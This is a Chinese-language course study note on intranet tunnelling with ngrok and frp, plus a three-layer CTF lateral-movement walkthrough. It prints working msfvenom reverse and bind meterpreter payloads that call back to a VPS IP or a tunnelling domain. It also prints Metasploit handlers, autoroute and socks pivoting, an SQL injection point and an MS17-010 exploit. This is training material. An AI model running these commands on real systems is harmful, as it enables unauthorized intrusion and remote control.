# 2026-09-01 内网安全⑥：域横向漫游——Socket 穿透/代理隧道技术（Ngrok / Frp / CFS 三层漫游）

> 状态：🧪 理论（课程截图），待实操
> 承接 08-31/09-01 域横向移动系列：前面学的是「拿到凭据后怎么横向打」（服务协议/哈希票据），这节课解决的是**网络层面到不了的问题**——目标内网和你不在一个网段（双内网/多层内网）时，怎么**穿透代理**过去横向漫游。
> 课程三大案例：① Ngrok（免费主机穿透两个内网通讯）② Frp（自建跳板）③ CFS 三层内网漫游综合演练（TP5_RCE → SQL 注入 → MS17010 三层打穿）。

## 一、一句话认知

**内网穿透/代理隧道** = 当你（攻击机）和靶标内网**物理上不通**（不同内网段、多层内网）时，借助一台**双方都能到达的中间节点**（公网 VPS / 免费穿透服务商 / 已控内网主机），把流量"架桥"过去——**正向**是目标连你，**反向**是你连目标的跳板，配合 socks 代理 + 工具（proxychains / Proxifier / SocksCap64）让任意工具都能打内网深处。

## 二、必要基础知识点 + 导图总览

**必要基础知识点**（课程原话）：
1. 内外网简单知识（内网 = 私网段 10/172.16/192.168，外网 = 公网；穿透核心 = 内外网地址转换/可达性）
2. 内网1 和内网2 通信问题（两个不同内网之间怎么互相访问）
3. 正向反向协议通信连接问题（**正向**：目标开端口等攻击机连 = bind；**反向**：目标主动连攻击机 = reverse，绕过 NAT/防火墙）
4. 内网穿透代理隧道技术说明（代理 = 中间人转发流量）

```
代理（穿透）
├── 解决：内网有外网 / 内网有过滤 / 内网无外网
├── 方向：正向（bind） / 反向（reverse）
└── 工具：nps / frp / ngrok / reGeorg / sockscap64 / earthworm / proxifier / proxychains
穿透（导图只有节点，未展开，❓）
```

- 工具分类：**隧道架设**（nps/frp/ngrok/reGeorg/earthworm——把流量管道搭起来）+ **代理转发**（proxychains 命令行工具走 socks、Proxifier/SocksCap64 让 Windows 程序走代理）
- 三个"解决"场景：内网**有外网**（能出网 → 反向 shell / frp 反向）、内网**有过滤**（出网受限 → 协议伪装/HTTP 隧道）、内网**无外网**（完全隔离 → 只能正向 + 已控节点中转）

## 三、案例1：Ngrok 测试演示——两个内网通讯上线

> #案例1-内网穿透Ngrok测试演示-两个内网通讯上线
> 实验环境：两个不同的内网（有网络）实现穿透控制

```
1. 注册-购买-填写-确认  http://www.ngrok.cc/
   协议：http  本地端口：192.168.76.132:4444
2. 测试：内网1 执行后门 → 免费主机处理 → 内网2 监听 → 内网2 接受器
```

```cmd
./sunny clientid aa0676878c162ffc          # 内网1（被控侧）启动 ngrok 客户端（sunny 是 ngrok.cc 客户端）
msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe   # 生成反向 HTTP payload：lhost 填免费域名
```

```cmd
use exploit/multi/handler                   # 内网2（攻击侧）监听
set payload windows/meterpreter/reverse_http
set lhost 192.168.76.132
set lport 4444
exploit
```

- 流程拆解：内网1 跑 sunny 连**免费穿透服务商** → 拿到公网域名（xiaodisec.free.idcfengye.com）→ payload 的 lhost 填**域名**（不是真实 IP）→ 目标机回连域名 → 服务商转发到内网2 的监听端口
- 关键点：**lhost 填穿透服务的公网域名**，攻击机本地监听真实 IP 的 4444——服务商在中间做端口映射

## 四、案例2：Frp 自建跳板测试——两个内网通讯上线

> #案例2-内网穿透Frp自建跳板测试-两个内网通讯上线
> 自行搭建，方便修改，成本低，使用多样化，适合高富帅及隐私哥哥们（对比 ngrok 免费版：自建不受限、可改配置）

```
1. 服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）
2. 控制端-下载-解压-修改-启动
3. 靶机运行 frp 即可
```

**服务端（公网 VPS）配置 frps.ini：**

```ini
[common]
bind_port = 6677
```

```bash
./frps -c ./frps.ini        # 启动服务端
```

**控制端（攻击机）配置 frpc.ini：**

```ini
[common]
server_addr = <VPS公网IP>      # 截图截断，按 frp 标准配置补全
server_port = 6677
remote_port = 6000             # 服务端用 6000 端口转发给本机
```

```bash
./frpc -c ./frpc.ini        # 启动控制端
```

**生成 payload + 监听：**

```cmd
msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.160.211 lport=6000 -f exe -o frp.exe   # lhost=公网 VPS IP，lport=6000（frpc 的 remote_port）
```

```cmd
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1        # 本地监听 127.0.0.1:5555（frpc 把 VPS 的 6000 转发到本机 5555）
set LPORT 5555
exploit
```

- 流程拆解：靶机运行 frp.exe → 回连 **VPS 的 6677**（frps）→ frpc（攻击机）提前与 frps 建立隧道并声明 **remote_port 6000** → VPS 把 6000 收到的流量转发给 frpc → 本地监听 5555 接住 → **目标 shell 到手**
- 和 ngrok 区别：**完全自建**（VPS + frp 程序），配置可见可改、流量不过第三方，成本=一台 VPS
- ⚠️ 阿里云等云主机记得**改安全组**放行相关端口（出入口）

## 五、案例3：CFS 三层内网漫游安全测试演练（某 CTF 线下 2019）

> #案例3-CFS三层内网漫游安全测试演练-某CTF线下2019
> 来源 2019 某 CTF 线下赛真题，内网结合 WEB 攻防题库，涉及 **WEB 攻击 + 内网代理路由**等技术；每台服务器存在一个 Flag，获取每个 Flag 对应一个积分，三个 Flag 结尾。

**拓扑（按案例推）：** 攻击机(192.168.76.132) → Target1(192.168.22.x) → Target2(192.168.22.128) → Target3(192.168.33.33)，**Target3 在更深网段（33 段），必须借 Target2 做跳板**

### Target1：TP5_RCE → webshell → Flag-Target2

```
探针目标-利用WEB漏洞（TP5_RCE）-获取webshell权限-获取Flag-Target2
```

```bash
# 1. 生成后门（反向）
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.76.132 LPORT=1111 -f elf > t1.elf
```

```cmd
# 2. 接受反弹
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.76.132
set LPORT 1111
exploit
```

### Target2：SQL 注入 → 后台 webshell → 正向 shell → 代理转发 → 打 Target3

```
探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3
```

```text
http://192.168.22.128/index.php?r=vu l&keyword=1    # sql注入点（截图带空格，实际应为 r=vul）
http://192.168.22.128/index.php?r=admini/public/login   # 后台
http://192.168.22.128/index.php?r=special           # 后门 shell
```

```bash
# 1. 生成正向后门（Target2 只能被 Target1 网段访问，用 bind_tcp 正向）
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf > t2.elf
```

```cmd
# 2. 访问接受（正向：等目标把 shell 送到本机 3333）
use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set rhost 192.168.22.128
set LPORT 3333
exploit
```

```cmd
# 3. 信息收集及配置访问（拿下 Target2 后用它做跳板）
run get_local_subnets            # 获取网络接口（看 Target2 连着哪些网段 → 发现 33 段）
run autoroute -p                 # 查看路由地址
run autoroute -s 192.168.33.0/24 # 添加路由地址（把 33 段路由挂到当前 session）
```

```cmd
# 4. 开启本地代理（socks 代理：让本机其他工具也能走 Target2 访问 33 段）
use auxiliary/server/socks4a
set srvport 2222
exploit
```

```
# 4. 利用本地代理接口访问测试（设置浏览器代理进行访问测试）
linux:   配置 proxychains 后调用工具探针 Target2
         /etc/proxychains.conf:  socks4 192.168.76.132 2222
         proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80
windows: 利用代理工具 Proxifier 或 SocksCap64 载入代理进行进程访问测试
```

- `-Pn`: 跳过主机发现，检测目标是否受数据包过滤/防火墙保护；`-sT`: TCP connect 扫描（走代理时用 -sT，因为 socks 不支持 SYN 半开）
- 高亮"192.168.**22**.0/24"：课程强调 proxychains 走的是 **Target2 视角的网络**（22 段），不是攻击机自己的网段
- 核心手法：**autoroute（msf 内部路由）+ socks4a（本机代理出口）**双通道——msf 模块直接走 autoroute 打 33 段，外部工具（nmap 等）走 socks 代理打

### Target3：端口扫描 → MS17010 → Flag-GG

```
探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag-GG
```

```cmd
proxychains4 nmap -Pn -sT 192.168.33.33                      # 经代理扫 33 段目标
use exploit/windows/smb/ms17_010_psexec                      # 永恒之蓝（CVE-2017-0144，导图漏洞分支）
set payload windows/meterpreter/bind_tcp                     # 33 段只能正向（Target3 无法回连攻击机）
set RHOST 192.168.33.33
exploit
shell
dir /S flag.txt /B                                           # 递归找 flag
```

- 三层网段全部正向/反向搭配：Target1 **反向**（能出网）→ Target2 **正向**（被代理访问）+ 代理转发 → Target3 **正向**（33 段最深处）
- MS17010 直接拿 SYSTEM 权限 → shell → dir /S 找 flag（高亮命令）

## 六、总结：内网安全⑥地图（穿透代理）

| 板块 | 内容 |
|------|------|
| 基础 | 内外网知识 / 双内网通信 / 正向反向连接 / 穿透代理隧道概念 |
| 导图 | 解决（有外网/有过滤/无外网）· 方向（正向 bind/反向 reverse）· 工具 8 件（nps/frp/ngrok/reGeorg/sockscap64/earthworm/proxifier/proxychains） |
| 案例1 Ngrok | 免费穿透服务：sunny clientid 连服务商 → payload lhost 填免费域名 → 服务商转发到攻击机 |
| 案例2 Frp | 自建：VPS frps(bind_port 6677) + 攻击机 frpc(remote_port 6000→本地 5555) + 靶机跑 frp.exe；云主机改安全组 |
| 案例3 CFS 三层 | Target1 TP5_RCE 反向 shell → Target2 SQL注入→bind_tcp 正向 + autoroute -s 33 段 + socks4a 2222 → proxychains4 扫 Target3 → MS17010 → flag |
| 代理使用 | Linux proxychains（socks 代理跑命令行工具）/ Windows Proxifier、SocksCap64（进程级代理） |

**一句话串起来**：穿透代理 = **"够不着就架桥"**——ngrok/frp 解决"两个内网互连"（借助公网中间人），CFS 解决"三层内网漫游"（一层一层打、autoroute+socks 把 33 段"拉"到本地）；工具矩阵里 **frp 自建最灵活**、**proxychains 是 Linux 走代理的标准姿势**、**Proxifier/SocksCap64 让 Windows 程序也能走代理**。

## 疑问

1. ❓ 导图「穿透」节点下的内容？（代理和穿透的区别？课程没展开）
2. ❓ nps / reGeorg / earthworm 具体怎么用？（导图列了 8 个工具，课程只演示了 ngrok 和 frp）
3. ❓ frpc.ini 的完整配置？（截图截断：server_addr/server_port/remote_port 的完整映射关系）
4. ❓ autoroute 和 socks4a 的区别与配合？（msf 内部路由 vs 本机代理出口，各自适用场景）
5. ❓ proxychains 走 socks 为什么必须 -sT？（socks 不支持 SYN 半开扫描？还有哪些 nmap 选项不兼容代理）
6. ❓ 三层漫游中 Target2 的正向 shell（bind_tcp）——handler 的 rhost 填什么？（攻击机视角没有 22 段路由时怎么连？靠 autoroute？）
7. ❓ reGeorg（HTTP 隧道）在"内网有过滤"场景的具体用法？（只能出 HTTP 的机器怎么穿透）

## 关联笔记

- [2026-09-01-内网安全-域横向移动SPN-Kerberoast与CobaltStrike-RDP.md](./2026-09-01-内网安全-域横向移动SPN-Kerberoast与CobaltStrike-RDP.md) — 横向移动手法（本课打通网络层后要用的"攻击手段库"）；CS 的横向能力与代理联动
- [2026-08-31-内网安全-域横向移动PTH-PTK-PTT哈希票据传递.md](./2026-08-31-内网安全-域横向移动PTH-PTK-PTT哈希票据传递.md) — 凭据传递（网络打通后横向的凭据来源）
- [2026-08-31-内网安全-域横向移动SMB与WMI传递.md](./2026-08-31-内网安全-域横向移动SMB与WMI传递.md) — SMB/WMI 服务横向（MS17010 打的就是 SMB 445）
- [2026-08-30(续)-内网安全-基本认知与信息收集.md](./2026-08-30(续)-内网安全-基本认知与信息收集.md) — 内网拓扑/网络架构探针（穿透前先摸清网段边界）

## 待实践

- 案例1：ngrok.cc 注册流程走一遍 → sunny clientid 启动 → payload lhost 填免费域名 → handler 接收
- 案例2：VPS 搭 frps（6677）→ 本地 frpc（remote_port 6000 → 本地 5555）→ msfvenom lhost=VPS_IP → 靶机跑 frp.exe → handler 接 shell
- 案例3：按 CFS 拓扑复现三层漫游——TP5_RCE 拿 Target1 → autoroute -s 33 段 → socks4a 2222 → proxychains4 nmap 扫 Target3 → MS17010 拿 flag
- 实操验证：proxychains 下 nmap 用 -sT（对比 -sS 报错）
- frpc.ini 完整配置对照官方文档补全（server_addr/server_port/remote_port 映射关系）

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
